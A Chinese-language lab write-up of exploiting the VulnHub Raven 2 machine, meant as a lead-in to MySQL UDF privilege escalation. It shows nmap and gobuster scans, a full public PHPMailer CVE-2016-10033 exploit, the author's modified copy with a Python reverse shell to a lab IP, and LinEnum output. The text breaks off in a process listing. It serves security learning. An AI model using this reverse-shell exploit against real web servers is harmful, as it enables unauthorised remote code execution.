- [0. 本不该有这篇的](#0-本不该有这篇的)
  - [0.1 靶机环境](#01-靶机环境)
- [1. 过程](#1-过程)
  - [1.1. linux](#11-linux)
  - [1.2. window](#12-window)
- [2. 遗留](#2-遗留)
- [3. 说明](#3-说明)
# 0. 本不该有这篇的
我相信mysql的UDF提权很多人都听说过，对于很多人来说也不陌生；然而对于我这个入行还不太久的新人来说，一直以来都只是知道其大概的思路：导入用户自定义函数(通过加载插件，windows就是加载`xx.dll`文件，linux就是加载`xx.so`文件),然后间接利用自定义函数执行系统命令。
然而渗透测试却是一个非常讲究实际操作能力的计算机活动；一个常见漏洞，不是你懂得原理就代表你有能力复现该漏洞，也不是知道的人很多、名气越大，实际中就不会遇见它；个人觉得学习一个漏洞最好的方法就是，懂得其原理-->搭建实际漏洞环境-->亲自复现漏洞。整个过程是非常痛苦的，尤其是搭建漏洞环境：费事费力，会花费你大量的时间，还不一定能成功.
> 问题摆出来，就必须想办法克服，我的办法就是寻找现成的靶机环境暂时弥补动手能力的不足。

## 0.1 靶机环境
> linux: `https://www.vulnhub.com/entry/raven-2,269/` 
> 
> windows: phpstudy

# 1. 过程

## 1.1. linux
<details>
<summary>1. 信息收集</summary>

```shell

┌──(root㉿kali)-[~]
└─# nmap -sT -p- -sC -A 192.168.0.102 -Pn -T 5 -oN raven2.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:29 EDT
Nmap scan report for raven.local (192.168.0.102)
Host is up (0.00031s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42747/udp   status
|   100024  1          43821/udp6  status
|   100024  1          47868/tcp   status
|_  100024  1          53319/tcp6  status
47868/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:DA:F0:F3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms raven.local (192.168.0.102)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
```

</details>


 2. 访问web页面发现有些图片加载不出来，通过查看源代码发现有使用的链接地址是 http://raven.local/xxxx.xxx ，因此要加入将 192.168.0.102	raven.local 加入到 /etchosts 

<details>
<summary>3. 使用gobuster扫描目录</summary>

```shell
gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/> dirb/common.txt -e -o raven2_gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.> txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/05/28 07:49:51 Starting gobuster in directory enumeration > mode
===============================================================
http://192.168.0.102/.hta                 (Status: 403) [Size: > 292]
http://192.168.0.102/.htpasswd            (Status: 403) [Size: > 297]
http://192.168.0.102/.htaccess            (Status: 403) [Size: > 297]
http://192.168.0.102/css                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/css/]
http://192.168.0.102/fonts                (Status: 301) [Size: > 314] [--> http://192.168.0.102/fonts/]
http://192.168.0.102/img                  (Status: 301) [Size: > 312] [--> http://192.168.0.102/img/]
http://192.168.0.102/index.html           (Status: 200) [Size: > 16819]
http://192.168.0.102/js                   (Status: 301) [Size: > 311] [--> http://192.168.0.102/js/]
http://192.168.0.102/`man`ual               (Status: 301) [Size: > 315] [--> http://192.168.0.102/`man`ual/]
http://192.168.0.102/server-status        (Status: 403) [Size: > 301]
http://192.168.0.102/vendor               (Status: 301) [Size: > 315] [--> http://192.168.0.102/vendor/]
http://192.168.0.102/wordpress            (Status: 301) [Size: > 318] [--> http://192.168.0.102/wordpress/]
==============================================================
2022/05/28 07:49:51 Finished
==============================================================
```
<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/1.png" width="56%">
</details>

<details>
<summary>4. 找到网站使用了	PHPMailer而且版本是5.2.16，网站路径是/var/www/html/vendor</summary>

<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/2.png" width="56%">

<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/3.png" width="56%">

</details>

<details><summary>5. phpmailer  exploit(kali上利用searchsploit搜索exploit)</summary>

```shell
┌──(root㉿kali)-[/kioptrix3]
└─# searchsploit phpmailer
---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
 Exploit > Title                                                         >                                                               >               |  Path
---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial of > Service                                                        >                                           | php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40968.sh
PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40970.php
PHPMailer < 5.2.18 - Remote Code > Execution                                                      >                                                    | php/> webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Injection > (Metasploit)                                                   >                                    | multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code > Execution                                                      >                                                    | php/> webapps/40969.py
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework > / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code > Execution                     | php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code > Execution                                                      >                                      | php/webapps/42221.py
PHPMailer < 5.2.21 - Local File > Disclosure                                                     >                                                     | php/> webapps/43056.py
WordPress Plugin PHPMailer 4.6 - Host Header Com`man`d Injection > (Metasploit)                                                   >                      | php/remote/42024.rb
---------------------------------------------------------------> ---------------------------------------------------------------> --------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿kali)-[/kioptrix3]
└─# searchsploit -p php/webapps/40974.py
  Exploit: PHPMailer < 5.2.18 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/40974
     Path: /usr/share/exploitdb/exploits/php/webapps/40974.py
File Type: Python script, Unicode text, UTF-8 text executable
```

</details>


<details>
<summary>6. 官方：https://www.exploit-db.com/exploits/40974 的源代码如下：</summary>

```python
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://localhost:8080'
backdoor = '/backdoor.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```

</details>

<details>
<summary>7. 需要做以下修改：</summary>

```python
# coding: utf-8
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from time import sleep
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://192.168.0.101/contact.php'
# 不要用backdoor.php这个文件名，否则会不成功，怀疑有文件名过滤。
backdoor = '/my.php'
backshell = target.split('/')[0] + '//' + target.split('/')[2] + backdoor


payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.100\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields = {'action': 'submit',
          'name': payload,
          'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/my.php server\" @protonmail.com',
          'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers = {'User-Agent': 'curl/7.47.0',
           'Content-Type': m.content_type}
# 增加代理，是为了burpsuite抓包排错，方便进行对比
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers,proxies=proxies)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
# 为了防止服务器在创建后门文件的时候访问后门文件，因此增加延迟进行访问。
sleep(5);
r = requests.get(backshell, headers=headers, proxies=proxies)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)

```

<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/4.png" width="56%">

</details>


<details>
<summary>8. mysql提权(先上传LinEnum.sh脚本并执行)</summary>

```shell
www-data@Raven:/tmp$ ./test.sh
./test.sh
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982
[-] Debug Info
[+] Thorough tests = Disabled
Scan started at:
Sun May 29 03:12:06 AEST 2022
### SYSTEM ##############################################
[-] Kernel information:
Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
[-] Kernel information (continued):
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
[-] Hostname:
Raven
### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Fri Nov  9 09:23:40 +1100 2018
steven           tty1                      Fri Nov  9 08:07:41 +1100 2018
[-] Who else is logged on:
 03:12:06 up  1:36,  0 users,  load average: 0.14, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
uid=104(Debian-exim) gid=109(Debian-exim) groups=109(Debian-exim)
uid=105(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=106(statd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
uid=108(smmta) gid=114(smmta) groups=114(smmta)
uid=109(smmsp) gid=115(smmsp) groups=115(smmsp)
uid=110(mysql) gid=116(mysql) groups=116(mysql)
uid=1001(steven) gid=1001(steven) groups=1001(steven)
[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
michael:x:1000:1000:michael,,,:/home/michael:/bin/bash
smmta:x:108:114:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:109:115:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
steven:x:1001:1001::/home/steven:/bin/sh
[-] Super user account(s):
root
[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root    root    4.0K Aug 13  2018 .
drwxr-xr-x 22 root    root    4.0K Aug 13  2018 ..
drwxr-xr-x  2 michael michael 4.0K Aug 13  2018 michael
drwxr-xr-x  2 root    root    4.0K Aug 13  2018 steven
### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
LANG=C
APACHE_RUN_GROUP=www-data
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
_=/usr/bin/env
[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
drwxr-xr-x 2 root root   4096 Aug 13  2018 /bin
drwxr-xr-x 2 root root   4096 Aug 13  2018 /sbin
drwxr-xr-x 2 root root  24576 Aug 13  2018 /usr/bin
drwxrwsr-x 2 root staff  4096 Aug 13  2018 /usr/local/bin
drwxrwsr-x 2 root staff  4096 Aug 13  2018 /usr/local/sbin
drwxr-xr-x 2 root root   4096 Aug 13  2018 /usr/sbin
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
[-] Current umask value:
0022
u=rwx,g=rx,o=rx
[-] umask value as specified in /etc/login.defs:
UMASK		022
[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512
### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Jun 11  2015 /etc/crontab
/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Aug 13  2018 .
drwxr-xr-x 89 root root 4096 May 29 02:26 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rw-r--r--  1 root root  661 Jun 27  2018 php5
-rw-r--r--  1 root root 2315 Aug 13  2018 sendmail
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Aug 13  2018 .
drwxr-xr-x 89 root root  4096 May 29 02:26 ..
-rw-r--r--  1 root root   102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root   625 Mar 31  2018 apache2
-rwxr-xr-x  1 root root 15000 Dec 11  2016 apt
-rwxr-xr-x  1 root root   314 Nov  9  2014 aptitude
-rwxr-xr-x  1 root root   355 Oct 18  2014 bsdmainutils
-rwxr-xr-x  1 root root  1597 May  3  2016 dpkg
-rwxr-xr-x  1 root root  4125 Feb 11  2018 exim4-base
-rwxr-xr-x  1 root root    89 Nov  9  2014 logrotate
-rwxr-xr-x  1 root root  1293 Jan  1  2015 man-db
-rwxr-xr-x  1 root root   435 Jun 13  2013 mlocate
-rwxr-xr-x  1 root root   249 May 18  2017 passwd
-rwxr-xr-x  1 root root  3302 Feb 13  2017 sendmail
/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug 13  2018 .
drwxr-xr-x 89 root root 4096 May 29 02:26 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug 13  2018 .
drwxr-xr-x 89 root root 4096 May 29 02:26 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Aug 13  2018 .
drwxr-xr-x 89 root root 4096 May 29 02:26 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root  771 Jan  1  2015 man-db
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
[-] Systemd timers:
NEXT                          LEFT     LAST                          PASSED       UNIT                         ACTIVATES
Mon 2022-05-30 01:50:45 AEST  22h left Sun 2022-05-29 01:50:45 AEST  1h 21min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
1 timers listed.
Enable thorough tests to see inactive timers
### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:0c:29:da:f0:f3
          inet addr:192.168.0.102  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:feda:f0f3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3132 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1508 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:343551 (335.4 KiB)  TX bytes:1634831 (1.5 MiB)
lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:307 errors:0 dropped:0 overruns:0 frame:0
          TX packets:307 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:51232 (50.0 KiB)  TX bytes:51232 (50.0 KiB)
[-] ARP history:
? (192.168.0.104) at 00:0c:29:d4:33:2b [ether] on eth0
? (192.168.0.1) at 60:3a:7c:31:e8:66 [ether] on eth0
? (192.168.0.100) at 00:0c:29:d4:33:2b [ether] on eth0
? (192.168.0.3) at a4:5e:60:c2:d9:0b [ether] on eth0
[-] Nameserver(s):
nameserver 61.128.114.133
nameserver 61.128.114.134
[-] Default route:
default         192.168.0.1     0.0.0.0         UG    0      0        0 eth0
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:42293           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::33102                :::*                    LISTEN      -
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:1005            0.0.0.0:*                           -
udp        0      0 127.0.0.1:1015          0.0.0.0:*                           -
udp        0      0 0.0.0.0:45349           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -
udp        0      0 0.0.0.0:8848            0.0.0.0:*                           -
udp6       0      0 :::49078                :::*                                -
udp6       0      0 :::1005                 :::*                                -
udp6       0      0 :::43851                :::*                                -
udp6       0      0 :::111                  :::*                                -
### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.9  28556  4636 ?        Ss   01:35   0:00 /sbin/init
root          2  0.0  0.0      0     0 ?        S    01:35   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S    01:35   0:00 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<   01:35   0:00 [kworker/0:0H]
root          6  0.0  0.0      0     0 ?        S    01:35   0:00 [kworker/u256:0]
root          7  0.0  0.0      0     0 ?        S    01:35   0:00 [rcu_sched]
root          8  0.0  0.0      0     0 ?        S    01:35   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S    01:35   0:00 [migration/0]
root         10  0.0  0.0      0     0 ?        S    01:35   0:00 [watchdog/0]
root         11  0.0  0.0      0     0 ?        S<   01:35   0:00 [khelper]
root         12  0.0  0.0      0     0 ?        S    01:35   0:00 [kdevtmpfs]
root         13  0.0  0.0      0     0 ?        S<   01:35   0:00 [netns]
root         14  0.0  0.0      0     0 ?        S    01:35   0:00 [khungtaskd]
root         15  0.0  0.0      0     0 ?        S<   01:35   0:00 [writeback]
root         16  0.0  0.0      0     0 ?        SN   01:35   0:00 [ksmd]
root         17  0.0  0.0      0     0 ?        S<   01:35   0:00 [crypto]
root         18  0.0  0.0      0     0 ?        S<   01:35   0:00 [kintegrityd]
root         19  0.0  0.0      0     0 ?        S<   01:35   0:00 [bioset]
root         20  0.0  0.0      0     0 ?        S<   01:35   0:00 [kblockd]
root         22  0.0  0.0      0     0 ?        S    01:35   0:00 [kswapd0]
root         23  0.0  0.0      0     0 ?        S<   01:35   0:00 [vmstat]
root         24  0.0  0.0      0     0 ?        S    01:35   0:00 [fsnotify_mark]
root         30  0.0  0.0      0     0 ?        S<   01:35   0:00 [kthrotld]
root         31  0.0  0.0      0     0 ?        S<   01:35   0:00 [ipv6_addrconf]
root         33  0.0  0.0      0     0 ?        S<   01:35   0:00 [deferwq]
root         67  0.0  0.0      0     0 ?        S<   01:35   0:00 [ata_sff]
root         68  0.0  0.0      0     0 ?        S<   01:35   0:00 [mpt_poll_0]
root         69  0.0  0.0      0     0 ?        S    01:35   0:00 [khubd]
root         70  0.0  0.0      0     0 ?        S<   01:35   0:00 [mpt/0]
root         71  0.0  0.0      0     0 ?        S<   01:35   0:00 [kpsmoused]
root         74  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_0]
root         75  0.0  0.0      0     0 ?        S<   01:35   0:00 [scsi_tmf_0]
root         76  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_1]
root         77  0.0  0.0      0     0 ?        S    01:35   0:00 [kworker/u256:2]
root         79  0.0  0.0      0     0 ?        S<   01:35   0:00 [scsi_tmf_1]
root         80  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_2]
root         81  0.0  0.0      0     0 ?        S<   01:35   0:00 [scsi_tmf_2]
root         84  0.0  0.0      0     0 ?        S<   01:35   0:00 [kworker/0:1H]
root        105  0.0  0.0      0     0 ?        S    01:35   0:00 [jbd2/sda1-8]
